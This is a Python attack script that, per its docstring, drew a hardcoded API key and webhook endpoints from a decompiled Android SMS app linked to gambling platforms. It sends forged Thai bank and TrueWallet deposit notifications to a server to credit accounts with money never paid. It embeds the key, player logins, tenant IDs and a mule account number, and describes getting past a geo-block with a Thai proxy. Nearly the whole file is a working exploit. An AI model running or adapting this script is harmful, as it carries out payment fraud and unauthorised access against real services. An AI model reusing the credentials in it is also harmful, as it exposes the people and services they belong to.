#!/usr/bin/env python3 -I
"""
probe45_apk_webhook_injection.py
F60: PAPDIEAW-KEY hardcoded in public APK + C2 webhook injection path.

Architecture from LuxSms-v3.apk (jadx decompile):
  APK → C2 (xyzwalldetop.com) → Platform (pbapi.asdgapicenterssdo.com)

C2 endpoints (from ListApi.java / ApiLogin.java):
  POST /service/authenticate      -> get C2 bearer token
  POST /service/deposit/get-endpoint-webhook (Bearer token) -> get per-bank URLs+keys
  POST /webhook-kbank             -> no auth header required
  POST /webhook-sms               -> no auth header required
  POST /webhook-scb               -> no auth header required
  POST /webhooks/sms/truewallet   -> PAPDIEAW-KEY: <hardcoded> required

Hardcoded key from ListApi.java line 48:
  PAPDIEAW-KEY: 649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80

Payload (ReadSmsRequest) for kbank/scb/sms:
  {address, message, timestamp(ms), bank_no, sms_id, type, bank_code, username, password, amount}
  NOTE: field is "sms_id" not "smsid" (from @SerializedName("sms_id") in ReadSmsRequest.java)

Payload (SendSmsRequest) for /webhooks/sms/truewallet:
  {address, message, timestamp(ms), phone_owner}

BLOCKING FACTOR: xyzwalldetop.com subdomains are CF geo-blocked for non-Thai IPs.
  From Thai IP: hit C2 directly, no auth needed for kbank/scb/sms webhooks.
  From non-Thai IP: all paths return 404 (CF geo-block confirmed 2026-10-15).

Usage (requires Thai IP or proxy):
  python3 -I probe45_apk_webhook_injection.py --tenant we88c --bank kbank --amount 1000
"""

import os, sys, time, json, argparse
import urllib.request, urllib.error

PAPDIEAW_KEY = os.getenv("PAPDIEAW_KEY", "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80")

TENANTS = {
    "vak88z2": "af6efb584a3d317b5a11ab6209b88e1b",
    "we88c":   "54ef7626cb381f4bab8be91f0cdbce47",
    "slxoz1688": "09b2c3ab78fa9e070e9b0517ed1508d5",
}

PLAYER_CREDS = {
    "we88c":    ("0972571110", "Pwned2026!"),
    "slxoz1688": ("0972571110", "Aa112233"),
    "vak88z2":  ("0811111111", "LOCKED_SKIP"),
}

# C2 base URL (geo-blocked for non-Thai IPs)
C2_BASE = "https://{tid}.xyzwalldetop.com"

# Platform pbapi base URL
PBAPI_BASE = "https://{tid}pbapi.asdgapicenterssdo.com"

def request(url, data=None, headers=None, timeout=15):
    req = urllib.request.Request(url, data=data, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return None, str(e)

def inject_kbank_c2(tid, username, password, bank_no, amount):
    """Inject fake KBANK deposit via C2 (no auth header required)."""
    ts = int(time.time() * 1000)
    url = C2_BASE.format(tid=tid) + "/webhook-kbank"
    body = json.dumps({
        "address": "KBANK",
        "message": f"รับเงิน {amount:.2f} บาท จาก พร้อมเพย์",
        "timestamp": ts,
        "bank_no": bank_no,
        "sms_id": f"SMS{ts}",
        "type": "deposit",
        "bank_code": "KBANK",
        "username": username,
        "password": password,
        "amount": f"{amount:.2f}"
    }).encode()
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "LuxSms/3.0 Android",
    }
    print(f"[C2/KBANK] POST {url}")
    status, resp = request(url, data=body, headers=headers)
    print(f"  Status: {status}")
    print(f"  Response: {resp[:300]}")
    return status, resp

def inject_truewallet_c2(tid, phone_owner, amount):
    """Inject fake TrueWallet deposit via C2 (PAPDIEAW-KEY required)."""
    ts = int(time.time() * 1000)
    url = C2_BASE.format(tid=tid) + "/webhooks/sms/truewallet"
    body = json.dumps({
        "address": "TrueWallet",
        "message": f"ได้รับโอนเงิน {amount:.2f} บาท",
        "timestamp": ts,
        "phone_owner": phone_owner,
    }).encode()
    headers = {
        "Content-Type": "application/json;charset=UTF-8",
        "PAPDIEAW-KEY": PAPDIEAW_KEY,
        "User-Agent": "LuxSms/3.0 Android",
    }
    print(f"[C2/TW] POST {url}")
    print(f"  PAPDIEAW-KEY: [REDACTED - env PAPDIEAW_KEY]")
    status, resp = request(url, data=body, headers=headers)
    print(f"  Status: {status}")
    print(f"  Response: {resp[:300]}")
    return status, resp

def probe_c2_health(tid):
    """Check if C2 is reachable (non-Thai IPs will get 404 geo-block)."""
    url = C2_BASE.format(tid=tid) + "/public-health-check"
    status, resp = request(url)
    print(f"[C2/HEALTH] {url} → {status}")
    if status == 404 and "Page Not Found" in resp:
        print("  ⚠ CF geo-block active (non-Thai IP). Need Thai proxy.")
    elif status == 200:
        print("  ✓ C2 reachable!")
    return status, resp

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--tenant", choices=list(TENANTS.keys()), default="we88c")
    parser.add_argument("--bank", choices=["kbank","scb","truewallet"], default="kbank")
    parser.add_argument("--amount", type=float, default=500.0)
    parser.add_argument("--bank-no", default="0543753327")  # slxoz1688 mule
    args = parser.parse_args()

    tid = TENANTS[args.tenant]
    username, password = PLAYER_CREDS[args.tenant]

    print(f"\n=== APK Webhook Injection Probe ===")
    print(f"Tenant: {args.tenant} (TID: {tid})")
    print(f"Player: {username}")
    print()

    # Step 1: Check C2 reachability
    probe_c2_health(tid)
    print()

    # Step 2: Attempt injection
    if args.bank == "truewallet":
        inject_truewallet_c2(tid, username, args.amount)
    else:
        inject_kbank_c2(tid, username, password, args.bank_no, args.amount)

if __name__ == "__main__":
    main()
